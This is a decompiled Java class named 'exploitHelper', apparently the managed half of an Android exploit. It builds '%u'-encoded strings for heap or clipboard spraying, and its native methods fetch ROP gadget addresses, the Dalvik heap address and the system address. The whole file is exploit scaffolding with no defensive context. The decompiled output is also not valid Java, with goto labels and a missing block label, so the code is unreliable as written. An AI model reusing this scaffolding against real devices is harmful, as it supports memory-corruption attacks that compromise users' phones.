// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: braces fieldsfirst space lnc 

package org.keenteam;


public class exploitHelper
{

    public exploitHelper()
    {
    }

    public static String intToUnescapeString(int i)
    {
        String s;
        String s1;
        s = (new StringBuilder(String.valueOf(""))).append("%u").toString();
        s1 = Integer.toHexString(0xffff & i >> 16);
_L3:
        if (s1.length() != 4) goto _L2; else goto _L1
_L1:
        String s2 = Integer.toHexString(i & 0xffff);
_L4:
        if (s2.length() == 4)
        {
            return (new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf(s))).append(s2).toString()))).append("%u").toString()))).append(s1).toString();
        }
        break MISSING_BLOCK_LABEL_130;
_L2:
        s1 = (new StringBuilder("0")).append(s1).toString();
          goto _L3
        s2 = (new StringBuilder("0")).append(s2).toString();
          goto _L4
    }

    public static String unescape(String s)
    {
        StringBuffer stringbuffer = new StringBuffer();
        stringbuffer.ensureCapacity(s.length());
        int i = 0;
        do
        {
            if (i >= s.length())
            {
                return stringbuffer.toString();
            }
            int j = s.indexOf("%", i);
            if (j == i)
            {
                if (s.charAt(j + 1) == 'u')
                {
                    stringbuffer.append((char)Integer.parseInt(s.substring(j + 2, j + 6), 16));
                    i = j + 6;
                } else
                {
                    stringbuffer.append((char)Integer.parseInt(s.substring(j + 1, j + 3), 16));
                    i = j + 3;
                }
            } else
            if (j == -1)
            {
                stringbuffer.append(s.substring(i));
                i = s.length();
            } else
            {
                stringbuffer.append(s.substring(i, j));
                i = j;
            }
        } while (true);
    }

    public native String getAndroidVersion();

    public native String getBrand();

    public native int getClipboardSprayOffset();

    public native int getDalvikHeapAddr();

    public native int getGadget1();

    public native int getGadget2();

    public native int getGadget3();

    public native String getManufacturer();

    public native String getPlatform();

    public native int getSystemAddr();

    static 
    {
        System.loadLibrary("exploitHelper");
    }
}
